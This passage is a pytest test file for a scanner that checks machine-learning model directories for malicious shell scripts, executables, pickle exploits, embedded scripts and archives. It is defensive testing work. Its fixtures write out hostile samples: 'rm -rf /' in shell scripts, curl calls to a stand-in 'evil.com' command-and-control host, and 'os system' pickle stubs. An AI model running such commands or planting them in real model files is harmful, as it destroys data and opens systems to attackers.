            f for f in report.findings if f.category == FindingCategory.SHELL_SCRIPT
        ]
        assert len(shell_findings) >= 1

    def test_detects_elf_binary_in_dir(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        (model_dir / "malware").write_bytes(_make_elf_header())
        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)
        exe_findings = [
            f for f in report.findings if f.category == FindingCategory.EXECUTABLE
        ]
        assert len(exe_findings) >= 1

    def test_detects_pickle_exploit_in_dir(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        (model_dir / "evil.bin").write_bytes(b"os\nsystem" + b"\x00" * 10)
        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)
        pickle_findings = [
            f for f in report.findings if f.category == FindingCategory.PICKLE_EXPLOIT
        ]
        assert len(pickle_findings) >= 1

    def test_git_dir_skipped(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        git_dir = model_dir / ".git"
        git_dir.mkdir()
        (git_dir / "HEAD").write_bytes(b"ref: refs/heads/main")
        (git_dir / "evil.sh").write_bytes(b"#!/bin/sh\nrm -rf /\n")
        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)
        paths = [f.path for f in report.findings]
        assert not any(".git" in p for p in paths)
        scanned_paths = report.scanned_files
        assert not any(".git" in p for p in scanned_paths)

    def test_cache_dir_skipped(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        cache_dir = model_dir / "__pycache__"
        cache_dir.mkdir()
        (cache_dir / "evil.sh").write_bytes(b"#!/bin/sh\nrm -rf /\n")
        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)
        paths = report.scanned_files
        assert not any("__pycache__" in p for p in paths)

    def test_not_a_directory_raises(self, tmp_path: Path) -> None:
        scanner = ModelScanner()
        with pytest.raises(NotADirectoryError):
            scanner.scan_directory(tmp_path / "nonexistent")

    def test_file_path_raises(self, tmp_path: Path) -> None:
        f = tmp_path / "file.bin"
        f.write_bytes(b"x")
        scanner = ModelScanner()
        with pytest.raises(NotADirectoryError):
            scanner.scan_directory(f)

    def test_accepts_string_path(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        scanner = ModelScanner()
        report = scanner.scan_directory(str(model_dir))
        assert isinstance(report, ScanReport)

    def test_subdirectory_files_scanned(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        subdir = model_dir / "shards"
        subdir.mkdir()
        (subdir / "shard.bin").write_bytes(b"\x00" * 100)
        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)
        assert report.scanned_count == 4  # 3 original + 1 shard

    def test_scanned_files_use_forward_slash(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        subdir = model_dir / "sub"
        subdir.mkdir()
        (subdir / "extra.json").write_bytes(b"{}")
        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)
        for path in report.scanned_files:
            assert "\\" not in path

    def test_check_flags_respected(self, tmp_path: Path) -> None:
        model_dir = self._make_clean_model_dir(tmp_path)
        (model_dir / "evil.sh").write_bytes(b"#!/bin/sh\nrm -rf /\n")
        # Disable script checking.
        scanner = ModelScanner(check_scripts=False)
        report = scanner.scan_directory(model_dir)
        shell_findings = [
            f for f in report.findings if f.category == FindingCategory.SHELL_SCRIPT
        ]
        assert len(shell_findings) == 0

    def test_empty_directory_returns_empty_report(self, tmp_path: Path) -> None:
        empty_dir = tmp_path / "empty_model"
        empty_dir.mkdir()
        scanner = ModelScanner()
        report = scanner.scan_directory(empty_dir)
        assert report.scanned_count == 0
        assert report.is_clean


# ---------------------------------------------------------------------------
# ModelScanner — scan_files
# ---------------------------------------------------------------------------


class TestModelScannerScanFiles:
    def test_scan_specific_files(self, tmp_path: Path) -> None:
        f1 = tmp_path / "config.json"
        f1.write_bytes(b'{"model_type": "bert"}')
        f2 = tmp_path / "evil.sh"
        f2.write_bytes(b"#!/bin/sh\nrm -rf /\n")
        scanner = ModelScanner()
        report = scanner.scan_files([f1, f2], model_id="test-model")
        assert report.scanned_count == 2
        shell_findings = [
            f for f in report.findings if f.category == FindingCategory.SHELL_SCRIPT
        ]
        assert len(shell_findings) >= 1

    def test_base_dir_produces_relative_paths(self, tmp_path: Path) -> None:
        subdir = tmp_path / "model"
        subdir.mkdir()
        f = subdir / "config.json"
        f.write_bytes(b"{}")
        scanner = ModelScanner()
        report = scanner.scan_files([f], base_dir=subdir, model_id="test")
        assert "config.json" in report.scanned_files

    def test_empty_file_list_returns_empty_report(self) -> None:
        scanner = ModelScanner()
        report = scanner.scan_files([], model_id="test")
        assert report.scanned_count == 0
        assert report.is_clean

    def test_model_id_preserved(self, tmp_path: Path) -> None:
        f = tmp_path / "config.json"
        f.write_bytes(b"{}")
        scanner = ModelScanner()
        report = scanner.scan_files([f], model_id="bert-base")
        assert report.model_id == "bert-base"

    def test_detects_elf_in_file_list(self, tmp_path: Path) -> None:
        f = tmp_path / "binary"
        f.write_bytes(_make_elf_header())
        scanner = ModelScanner()
        report = scanner.scan_files([f], model_id="test")
        exe_findings = [
            ff for ff in report.findings if ff.category == FindingCategory.EXECUTABLE
        ]
        assert len(exe_findings) >= 1


# ---------------------------------------------------------------------------
# ModelScanner — scan_file_bytes
# ---------------------------------------------------------------------------


class TestModelScannerScanFileBytes:
    def test_clean_bytes_returns_clean_report(self) -> None:
        data = b'{"model_type": "bert"}'
        scanner = ModelScanner()
        report = scanner.scan_file_bytes("config.json", data)
        assert isinstance(report, ScanReport)

    def test_elf_bytes_detected(self) -> None:
        data = _make_elf_header()
        scanner = ModelScanner()
        report = scanner.scan_file_bytes("binary", data)
        exe_findings = [
            f for f in report.findings if f.category == FindingCategory.EXECUTABLE
        ]
        assert len(exe_findings) >= 1

    def test_pickle_exploit_detected(self) -> None:
        data = b"os\nsystem" + b"\x00" * 10
        scanner = ModelScanner()
        report = scanner.scan_file_bytes("model.bin", data)
        pickle_findings = [
            f for f in report.findings if f.category == FindingCategory.PICKLE_EXPLOIT
        ]
        assert len(pickle_findings) >= 1

    def test_path_in_scanned_files(self) -> None:
        scanner = ModelScanner()
        report = scanner.scan_file_bytes("config.json", b"{}")
        assert "config.json" in report.scanned_files

    def test_model_id_preserved(self) -> None:
        scanner = ModelScanner()
        report = scanner.scan_file_bytes("config.json", b"{}", model_id="bert-base")
        assert report.model_id == "bert-base"

    def test_check_flags_respected(self) -> None:
        data = b"os\nsystem" + b"\x00" * 10
        scanner = ModelScanner(check_pickle=False)
        report = scanner.scan_file_bytes("model.bin", data)
        pickle_findings = [
            f for f in report.findings if f.category == FindingCategory.PICKLE_EXPLOIT
        ]
        assert len(pickle_findings) == 0


# ---------------------------------------------------------------------------
# scan_directory (module-level convenience function)
# ---------------------------------------------------------------------------


class TestScanDirectoryConvenience:
    def test_returns_scan_report(self, tmp_path: Path) -> None:
        model_dir = tmp_path / "model"
        model_dir.mkdir()
        (model_dir / "config.json").write_bytes(b"{}")
        report = scan_directory(model_dir)
        assert isinstance(report, ScanReport)

    def test_model_id_from_dir_name(self, tmp_path: Path) -> None:
        model_dir = tmp_path / "bert_model"
        model_dir.mkdir()
        (model_dir / "config.json").write_bytes(b"{}")
        report = scan_directory(model_dir)
        assert report.model_id == "bert_model"

    def test_custom_model_id(self, tmp_path: Path) -> None:
        model_dir = tmp_path / "model"
        model_dir.mkdir()
        (model_dir / "config.json").write_bytes(b"{}")
        report = scan_directory(model_dir, model_id="custom-id")
        assert report.model_id == "custom-id"

    def test_detects_evil_sh(self, tmp_path: Path) -> None:
        model_dir = tmp_path / "model"
        model_dir.mkdir()
        (model_dir / "config.json").write_bytes(b"{}")
        (model_dir / "evil.sh").write_bytes(b"#!/bin/sh\nrm -rf /\n")
        report = scan_directory(model_dir)
        assert not report.is_clean


# ---------------------------------------------------------------------------
# scan_file_bytes (module-level convenience function)
# ---------------------------------------------------------------------------


class TestScanFileBytesConvenience:
    def test_returns_scan_report(self) -> None:
        report = scan_file_bytes("config.json", b"{}")
        assert isinstance(report, ScanReport)

    def test_model_id_default(self) -> None:
        report = scan_file_bytes("config.json", b"{}")
        assert report.model_id == "unknown"

    def test_model_id_custom(self) -> None:
        report = scan_file_bytes("config.json", b"{}", model_id="bert-base")
        assert report.model_id == "bert-base"

    def test_elf_detected(self) -> None:
        report = scan_file_bytes("binary", _make_elf_header())
        exe_findings = [
            f for f in report.findings if f.category == FindingCategory.EXECUTABLE
        ]
        assert len(exe_findings) >= 1

    def test_clean_file_is_clean(self) -> None:
        report = scan_file_bytes("config.json", b'{"model_type": "bert"}')
        # No critical/high findings for a clean JSON config.
        assert not report.has_critical_or_high


# ---------------------------------------------------------------------------
# _iter_files helper
# ---------------------------------------------------------------------------


class TestIterFiles:
    def test_yields_files(self, tmp_path: Path) -> None:
        (tmp_path / "a.json").write_bytes(b"{}")
        (tmp_path / "b.bin").write_bytes(b"\x00" * 10)
        files = list(_iter_files(tmp_path))
        assert len(files) == 2

    def test_skips_git_dir(self, tmp_path: Path) -> None:
        (tmp_path / "config.json").write_bytes(b"{}")
        git_dir = tmp_path / ".git"
        git_dir.mkdir()
        (git_dir / "HEAD").write_bytes(b"ref: refs/heads/main")
        files = list(_iter_files(tmp_path))
        paths = [str(f) for f in files]
        assert not any(".git" in p for p in paths)

    def test_skips_pycache(self, tmp_path: Path) -> None:
        (tmp_path / "config.json").write_bytes(b"{}")
        cache_dir = tmp_path / "__pycache__"
        cache_dir.mkdir()
        (cache_dir / "module.pyc").write_bytes(b"compiled")
        files = list(_iter_files(tmp_path))
        paths = [str(f) for f in files]
        assert not any("__pycache__" in p for p in paths)

    def test_recurses_into_subdirs(self, tmp_path: Path) -> None:
        subdir = tmp_path / "sub"
        subdir.mkdir()
        (tmp_path / "top.json").write_bytes(b"{}")
        (subdir / "nested.bin").write_bytes(b"\x00" * 10)
        files = list(_iter_files(tmp_path))
        assert len(files) == 2

    def test_returns_path_objects(self, tmp_path: Path) -> None:
        (tmp_path / "file.json").write_bytes(b"{}")
        files = list(_iter_files(tmp_path))
        for f in files:
            assert isinstance(f, Path)

    def test_empty_directory(self, tmp_path: Path) -> None:
        files = list(_iter_files(tmp_path))
        assert len(files) == 0


# ---------------------------------------------------------------------------
# Integration: real files with multiple threat types
# ---------------------------------------------------------------------------


class TestIntegrationScanning:
    def test_full_scan_clean_model(self, tmp_path: Path) -> None:
        """A clean model directory should produce no critical/high findings."""
        model_dir = tmp_path / "clean_bert"
        model_dir.mkdir()
        (model_dir / "config.json").write_bytes(
            b'{"model_type": "bert", "hidden_size": 768}'
        )
        (model_dir / "tokenizer.json").write_bytes(b'{"version": "1.0"}')
        (model_dir / "vocab.txt").write_bytes(b"[PAD]\n[UNK]\nhello\nworld\n")
        # Clean binary (no ELF/PE magic, no pickle exploits).
        (model_dir / "pytorch_model.bin").write_bytes(b"\x80\x02" + b"\x00" * 100)

        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)

        # No critical findings.
        assert len(report.critical_findings) == 0

    def test_full_scan_malicious_model(self, tmp_path: Path) -> None:
        """A model with multiple threats should produce critical findings."""
        model_dir = tmp_path / "malicious_model"
        model_dir.mkdir()
        # Legitimate-looking config.
        (model_dir / "config.json").write_bytes(b'{"model_type": "bert"}')
        # ELF binary hidden in repo.
        (model_dir / "libhook.so").write_bytes(_make_elf_header())
        # Pickle exploit.
        (model_dir / "weights.bin").write_bytes(b"os\nsystem" + b"\x00" * 20)
        # Shell script.
        (model_dir / "setup.sh").write_bytes(b"#!/bin/sh\ncurl http://evil.com/c2")

        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)

        assert len(report.critical_findings) >= 1
        assert not report.is_clean
        assert report.has_critical_or_high

    def test_python_exploit_in_model_dir(self, tmp_path: Path) -> None:
        """A Python script with dangerous patterns should be flagged."""
        model_dir = tmp_path / "py_exploit_model"
        model_dir.mkdir()
        (model_dir / "config.json").write_bytes(b'{"model_type": "bert"}')
        (model_dir / "loader.py").write_bytes(
            b"import subprocess\nsubprocess.Popen(['curl', 'http://evil.com'])\n"
        )

        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)

        embedded_findings = [
            f for f in report.findings if f.category == FindingCategory.EMBEDDED_SCRIPT
        ]
        assert len(embedded_findings) >= 1

    def test_nested_archive_in_model_dir(self, tmp_path: Path) -> None:
        """A nested archive in a model dir should be flagged."""
        model_dir = tmp_path / "archive_model"
        model_dir.mkdir()
        (model_dir / "config.json").write_bytes(b'{"model_type": "bert"}')
        # Create a fake zip file (just magic bytes for detection).
        (model_dir / "hidden_payload.zip").write_bytes(b"PK\x03\x04" + b"\x00" * 60)

        scanner = ModelScanner()
        report = scanner.scan_directory(model_dir)

        archive_findings = [
            f for f in report.findings if f.category == FindingCategory.ARCHIVE_BOMB
        ]
        assert len(archive_findings) >= 1
